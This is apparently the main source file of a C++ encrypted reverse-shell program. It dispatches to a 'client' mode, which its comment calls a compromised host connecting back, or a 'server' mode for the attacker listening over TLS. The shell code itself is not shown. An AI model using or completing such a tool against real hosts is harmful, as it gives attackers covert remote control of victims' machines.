#include "utils.h"
#include "args_parser.h"
#include "client.h"
#include "server.h"

int main(const int argc, char *argv[]) {

    /*  Program Layout
     *  User passes argument 'client' or 'server'
     *  'client' would be a compromised host attempting to connect back to attacker
     *  'server' would be an attacker waiting for a connection
     *
     *  if 'server' arg passed, we pass the IP address and port to listen on
     *
     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the listening 'server'
     *
     *  then connect and set up an encrypted rev shell (using OpenSSL TLS, Typically 1.2)
     */
    struct config cfg = parse_args(argc, argv);

    // check if parser worked
    if (cfg.execType.empty() || cfg.portNum <= 0 || cfg.ipAddr.empty()) {
        exit(-1);
    }

    if (cfg.execType == "server") {
        server(cfg.ipAddr, cfg.portNum);
    }
    else {
        client(cfg.ipAddr, cfg.portNum);
    }

    return 0;
}

